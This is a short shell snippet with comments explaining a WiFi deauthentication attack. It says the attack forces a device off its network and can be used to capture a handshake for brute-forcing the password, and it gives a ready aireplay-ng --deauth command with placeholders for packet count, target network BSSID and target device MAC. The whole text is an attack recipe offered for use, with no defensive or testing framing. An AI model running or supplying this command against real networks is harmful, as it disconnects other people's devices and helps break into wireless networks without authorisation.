# Deauthentication attack is a kind of attack to force a device to disconnect to its network
# This kind of attack can be used to break into network (brute-force password with handshake)
# Make sure your wireless adapter is connected to Linux machine
# Enable monitor mode on it

# Change wireless adapter interface based on your machine with ifconfig
aireplay-ng --deauth <number of packets of deauth (1000)> -a <target bssid network> -c <target MAC address device> wlan0